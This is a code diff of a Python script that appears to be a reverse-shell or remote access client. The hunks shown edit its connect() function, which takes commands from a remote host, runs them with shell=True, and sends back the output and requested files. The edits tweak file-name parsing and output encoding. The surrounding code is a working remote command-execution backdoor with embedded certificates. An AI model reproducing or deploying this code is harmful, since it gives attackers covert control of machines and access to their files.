@@ -81,6 +81,7 @@ except:
 
 system('chcp 65001')
 
+
 def create_keys():
     server_cert ='''\
 -----BEGIN CERTIFICATE-----
@@ -516,7 +517,7 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                     print_info("Received GET")
                     if OUTPUT_FILE:
                         log_line("Received GET")
-                file_name = data.split()[1].strip("[END]")
+                file_name = data[:-5:]
                 if path.exists(file_name):
                     if VERBOSE:
                         print_info("File Found! :) --> {}".format(file_name))
@@ -570,7 +571,7 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                         log_line("Received cmd --> {}".format(data))
                 if data.startswith("start "):
                     try:
-                        output = subprocess.call(data.split(" "), timeout=10, shell=True, stdin=subprocess.DEVNULL,stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL)
+                        output = subprocess.call(data.split(" "), timeout=10, shell=True, encoding="utf8", stdin=subprocess.DEVNULL,stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL)
                         send_data(conn, "Command Successfully Executed (no output expected)") # send back the result
                     except subprocess.TimeoutExpired:
                         if VERBOSE:
@@ -581,7 +582,7 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                     
                 else:
                     try:
-                        output = subprocess.run(data, timeout=10, shell=True, stdin=subprocess.DEVNULL,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
+                        output = subprocess.run(data, timeout=10, encoding="utf8", shell=True, stdin=subprocess.DEVNULL,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
                         if output.stderr != b"":
                             send_data(conn, output.stderr.decode('utf-8')) # send back the errors
                         elif output.stdout == b"":
